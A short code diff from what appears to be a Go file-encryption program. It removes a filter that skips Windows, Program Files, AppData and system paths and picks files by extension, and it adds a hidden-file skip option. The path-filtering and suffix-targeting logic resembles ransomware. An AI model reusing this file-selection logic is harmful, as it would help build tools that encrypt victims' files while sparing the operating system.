@@ -77,26 +77,6 @@ func decrypt(filename string, cip cipher.Block) error {
 	return nil
 }
 
-func filter(path string) int8 {
-
-	lowPath := strings.ToLower(path)
-
-	innerList := []string{"windows", "program", "appdata", "system"}
-	suffixList := settings.EncSuffixList
-
-	for _, inner := range innerList {
-		if strings.Contains(lowPath, inner) {
-			return 0
-		}
-	}
-	for _, suffix := range suffixList {
-		if strings.HasSuffix(lowPath, suffix) {
-			return 1
-		}
-	}
-	return 2
-}
-
 func doHandler(cip cipher.Block, ListChan chan string, ExitChan chan bool) {
 	for filename := range ListChan {
 		switch method {
@@ -138,6 +118,8 @@ type Config struct {
 
 	EncSuffix     string
 	EncSuffixList []string
+
+	SkipHidden bool
 }
 
 func (self *Config) init(EncData string) {
@@ -165,7 +147,7 @@ func (self *Config) init(EncData string) {
 }
 
 func reList(theList []string, count int) []string {
-	length:=len(theList)
+	length := len(theList)
 	tmpList := make([]string, length)
 	slNum := rand.Int() % len(theList)
 	copy(tmpList[0:length-slNum], theList[slNum:])
